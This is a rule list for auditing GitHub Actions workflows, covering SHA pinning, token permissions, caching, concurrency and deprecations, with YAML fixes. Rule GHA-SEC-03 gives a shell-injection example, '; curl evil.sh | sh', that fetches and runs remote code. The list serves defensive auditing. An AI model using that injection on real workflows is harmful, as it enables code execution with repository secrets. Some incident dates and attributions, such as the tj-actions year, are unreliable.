# GitHub Actions Audit Rules

This is the canonical rule list used by the `ci-yaml` skill in audit mode. Each rule has a stable ID (`GHA-{CATEGORY}-{NN}`), a severity, a precise check, and a concrete fix.

**Format conventions:**

- Severity: **Critical**, **High**, **Medium**, **Low**
- Each rule lists: *Check*, *Why*, *Fix*, *Counter-example* (where useful)
- Rules are ordered by severity then by frequency observed in real-world repos

---

## Category: Security (`GHA-SEC-*`)

### GHA-SEC-01 — Third-party actions are not SHA-pinned `[Critical]`

**Check.** Any `uses:` line that points to an action outside the `actions/` and `github/` namespaces, and that uses a tag (`@v1`, `@main`) instead of a 40-char commit SHA.

**Why.** A tag is mutable. A compromised maintainer or a typosquatted action repo can rewrite `@v1` to malicious code, and your next CI run executes it with your repo's `GITHUB_TOKEN`. Pinning to a SHA freezes the code you reviewed. The 2022 `tj-actions/changed-files` and 2024 SolarWinds-style supply-chain incidents are this exact mechanism.

**Fix.** Replace tag with the full commit SHA. Add a comment with the human-readable version for future maintainers:

```yaml
- uses: astral-sh/setup-uv@e92bafb6253dcd438e0484186d7669ea7a8ca1cc  # v3.2.0
```

**Counter-example (allowed).** First-party actions in `actions/` or `github/` namespaces may use `@v4` major-version tags — Anthropic, GitHub, and Google all approve this for actions they themselves maintain.

---

### GHA-SEC-02 — `permissions:` block is missing or `write-all` `[Critical]`

**Check.** No top-level `permissions:` key, OR `permissions: write-all`.

**Why.** `GITHUB_TOKEN` has `contents: write` by default in many older repos. A compromised dependency in any step can use that token to push to the default branch or create releases. Least-privilege explicit declaration prevents this.

**Fix.** Add at workflow root (or per job for finer control):

```yaml
permissions:
  contents: read    # minimum to checkout
  # Add only what each step actually needs:
  # pull-requests: write   # for commenting on PRs
  # id-token: write        # for OIDC (e.g., PyPI trusted publishing)
```

---

### GHA-SEC-03 — User-controlled input interpolated into shell `[Critical]`

**Check.** Any `run:` step that uses `${{ github.event.pull_request.title }}`, `${{ github.head_ref }}`, `${{ github.event.issue.body }}`, or similar, directly inside a shell command.

**Why.** A PR title containing `; curl evil.sh | sh` becomes shell injection. This was the [pwn request](https://github.com/AdnaneKhan/ActionsPwnExamples) class of vulnerability — see GitHub's own 2023 advisory.

**Fix.** Pass through env, never inline:

```yaml
- run: echo "$PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

---

### GHA-SEC-04 — `pull_request_target` checks out PR head without sandboxing `[Critical]`

**Check.** Workflow trigger is `pull_request_target` AND `actions/checkout` uses `ref: ${{ github.event.pull_request.head.sha }}` AND any subsequent step uses `secrets.*`.

**Why.** `pull_request_target` runs with secrets in scope. Checking out the PR's head means an attacker's PR code runs with your secrets. This is one of the most exploited Actions misconfigurations.

**Fix.** Either use `pull_request` trigger (no secrets), or split into two workflows: one with `pull_request_target` that does only privileged-but-safe work, and one with `pull_request` that runs untrusted code without secrets.

---

### GHA-SEC-05 — Secrets logged or echoed `[High]`

**Check.** Any `run:` step that uses `echo`, `printenv`, `env`, or `set` and references a `secrets.*` value, even indirectly via env. Also flag if `ACTIONS_STEP_DEBUG` is set to `true`.

**Why.** GitHub redacts known secrets in logs, but indirect references (e.g., a derived token printed before being set as a secret) can leak. Step-debug mode logs all environment variables.

**Fix.** Never echo secrets. Drop debug mode for non-debugging runs. If you must verify a secret is present, echo only its length: `echo "Token length: ${#TOKEN}"`.

---

### GHA-SEC-06 — Runner OS uses `-latest` `[Medium]`

**Check.** `runs-on: ubuntu-latest`, `runs-on: macos-latest`, or `runs-on: windows-latest`.

**Why.** When GitHub rotates the `latest` alias to a new OS major (e.g., Ubuntu 22 → 24 in mid-2024), system tools change versions silently. CI that passed yesterday breaks today with no commit. Pinned versions make CI breakage explicit and tied to a workflow change.

**Fix.** `runs-on: ubuntu-22.04` (or `ubuntu-24.04`). Plan rotations explicitly.

---

## Category: Performance / Cost (`GHA-PERF-*`)

### GHA-PERF-01 — No dependency cache `[High]`

**Check.** Job installs Python or Node deps but does not use `actions/setup-python@v5` with `cache:`, `astral-sh/setup-uv` with `enable-cache: true`, `actions/setup-node@v4` with `cache:`, or a manual `actions/cache` step.

**Why.** Reinstalling deps on every run multiplies CI minutes by 3-10×. On a free GitHub plan with 2000 minutes/month, this is the single biggest cost drain.

**Fix (Python+uv).**

```yaml
- uses: astral-sh/setup-uv@v3
  with:
    enable-cache: true
```

**Fix (Python+pip).**

```yaml
- uses: actions/setup-python@v5
  with:
    python-version: ${{ matrix.python-version }}
    cache: 'pip'
    cache-dependency-path: requirements.txt
```

**Fix (Node).**

```yaml
- uses: actions/setup-node@v4
  with:
    node-version: ${{ matrix.node-version }}
    cache: 'pnpm'  # or 'npm' or 'yarn'
```

---

### GHA-PERF-02 — Cache key does not include lock file hash `[High]`

**Check.** Manual `actions/cache` step where the `key:` does not contain `${{ hashFiles('uv.lock') }}` (or the relevant lock file).

**Why.** A static cache key never invalidates, so dep updates don't take effect. A key based only on `runner.os` is shared across all branches and grows stale.

**Fix.**

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.cache/pip
    key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }}
    restore-keys: ${{ runner.os }}-pip-
```

---

### GHA-PERF-03 — No `concurrency:` block `[High]`

**Check.** No top-level `concurrency:` key.

**Why.** Pushing 5 commits to a PR triggers 5 separate workflow runs. Without concurrency cancellation, all 5 run to completion, billing for 4 you no longer care about.

**Fix.**

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

**Caveat.** For `release.yml` or anything that publishes artifacts, set `cancel-in-progress: false` — you don't want a half-published release.

---

### GHA-PERF-04 — Missing `timeout-minutes:` on jobs `[High]`

**Check.** Any `job:` definition without `timeout-minutes:`.

**Why.** GitHub's default is 360 minutes (6 hours). A hung pytest or stuck `apt-get` consumes 6 hours of billable compute before being killed.

**Fix.** Add a realistic upper bound to each job:

```yaml
jobs:
  test:
    runs-on: ubuntu-22.04
    timeout-minutes: 15  # actual run is usually 2-3 min
```

---

### GHA-PERF-05 — `paths-ignore` not used for docs-only changes `[Medium]`

**Check.** Workflow runs full test matrix on PRs that only touch `*.md`, `docs/`, `LICENSE`, etc.

**Why.** Tests don't validate prose. Wasted minutes.

**Fix.**

```yaml
on:
  pull_request:
    paths-ignore:
      - '**.md'
      - 'docs/**'
      - 'LICENSE'
```

---

### GHA-PERF-06 — Matrix job fans out beyond what `requires-python` declares `[Medium]`

**Check.** Python matrix includes versions outside the project's `requires-python` range.

**Why.** Wasted compute and confusing failures: a project that declares `>=3.10` may not work on 3.9 but the CI says "fix it."

**Fix.** Match the declared support range. If you want broader testing, update `requires-python` first.

---

## Category: Correctness (`GHA-COR-*`)

### GHA-COR-01 — Action used at deprecated major version `[High]`

**Check.** Common deprecations as of late 2025 / early 2026:

- `actions/checkout@v2` or `@v3` (deprecated; use `@v4`)
- `actions/setup-python@v3` or `@v4` (deprecated; use `@v5`)
- `actions/setup-node@v3` (deprecated; use `@v4`)
- `actions/cache@v2` or `@v3` (deprecated; use `@v4`)
- `actions/upload-artifact@v3` and `actions/download-artifact@v3` (deprecated since Jan 2025; use `@v4`)

**Why.** Deprecated versions stop receiving Node 20+ runtime updates and security patches. Some are scheduled for removal — workflows silently break.

**Fix.** Update the version pin. Re-test.

---

### GHA-COR-02 — Uses deprecated workflow command syntax `[High]`

**Check.** Any `run:` step that contains `::set-output name=` or `::save-state name=` or `::set-env name=`.

**Why.** These were deprecated in Oct 2022 and emit warnings. They will be removed.

**Fix.**

```yaml
# Old:
- run: echo "::set-output name=version::1.2.3"

# New:
- run: echo "version=1.2.3" >> "$GITHUB_OUTPUT"
```

---

### GHA-COR-03 — `fail-fast: true` (the default) on matrix jobs `[Medium]`

**Check.** A `strategy.matrix:` exists, but no `fail-fast: false`.

**Why.** With the default `fail-fast: true`, the first failing matrix job cancels all others. You wanted to know if Python 3.11 *and* 3.12 broke; you only learned about 3.10 (because it failed first and killed the rest).

**Fix.**

```yaml
strategy:
  fail-fast: false
  matrix:
    python-version: ["3.10", "3.11", "3.12"]
```

---

### GHA-COR-04 — Workflow runs only on `push` (or only on `pull_request`) `[Medium]`

**Check.** `on:` lists only `push` or only `pull_request`.

**Why.** Push-only misses contributor PRs from forks. PR-only misses verification of `main` after merge — a PR that passed against an old base can break against the post-merge state.

**Fix.**

```yaml
on:
  push:
    branches: [main]
  pull_request:
```

---

### GHA-COR-05 — No `name:` on jobs or steps `[Low]`

**Check.** Jobs or steps without `name:`.

**Why.** Anonymous steps surface as `Run actions/checkout@v4` in the GitHub UI, hard to scan when triaging failures. Costs nothing to label.

**Fix.** Give each step a 2-5 word name describing what it does, not what action it uses.

---

### GHA-COR-06 — Lint and test chained with `&&` `[Low]`

**Check.** A step like `run: ruff check . && pytest`.

**Why.** When lint fails, you don't get the test report. Two separate steps make both signals visible in the run summary.

**Fix.** Split into two steps with clear names.

---

## Category: Maintenance (`GHA-MNT-*`)

### GHA-MNT-01 — No Dependabot for actions `[Medium]`

**Check.** No `.github/dependabot.yml`, or one without a `package-ecosystem: "github-actions"` entry.

**Why.** Without auto-update PRs, action versions silently drift behind upstream. By the time you notice, three deprecations have happened.

**Fix.** Add `.github/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "monthly"
```

---

### GHA-MNT-02 — Workflow file naming inconsistent `[Low]`

**Check.** Files in `.github/workflows/` named like `test-action.yml`, `Build.yml`, `myWorkflow.yaml`.

**Why.** Convention is lowercase with hyphens, single-word purpose: `ci.yml`, `release.yml`, `docs.yml`, `nightly.yml`. Predictable names help future readers (and tooling like `actionlint`).

**Fix.** Rename. Update any references in README badges.

---

### GHA-MNT-03 — Duplicate steps across multiple jobs `[Low]`

**Check.** The same 5+ step sequence (checkout → setup-uv → install → lint → test) duplicated in two jobs.

**Why.** When you change one, you forget the other. Two jobs drift into different behavior.

**Fix.** Extract to a reusable workflow under `.github/workflows/_test.yml` and call with `uses: ./.github/workflows/_test.yml`. Worth it once you have 3+ jobs sharing a pattern.

---

## Quick triage by symptom

| Symptom user reports | Likely rule(s) |
|----------------------|----------------|
| "CI is slow" | GHA-PERF-01, GHA-PERF-03, GHA-PERF-04, GHA-PERF-05 |
| "CI is expensive" | GHA-PERF-03, GHA-PERF-04, GHA-PERF-05 |
| "CI broke after working yesterday" | GHA-COR-01, GHA-SEC-06 |
| "Dependabot keeps proposing weird actions updates" | GHA-MNT-01 (already configured, working) |
| "I want my workflow to be more secure" | GHA-SEC-01 → GHA-SEC-05 in order |
| "PR from fork failed but mine passes" | GHA-SEC-04, GHA-COR-04 |
